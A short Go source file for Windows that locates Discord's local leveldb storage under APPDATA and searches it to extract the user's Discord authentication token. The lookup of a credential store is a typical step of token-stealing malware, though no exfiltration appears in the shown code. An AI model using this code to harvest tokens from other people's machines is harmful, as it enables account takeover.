//+build windows

package token

import (
	"github.com/pkg/errors"
	"os"
	"path/filepath"
)

func GetToken() (tok string, err error) {
	appdata, def := os.LookupEnv("APPDATA")
	if !def {
		return "", errors.New("APPDATA path wasn't specified in environment")
	}
	path := filepath.Join(appdata, "Discord/Local Storage/leveldb")

	return searchLevelDB(path)
}
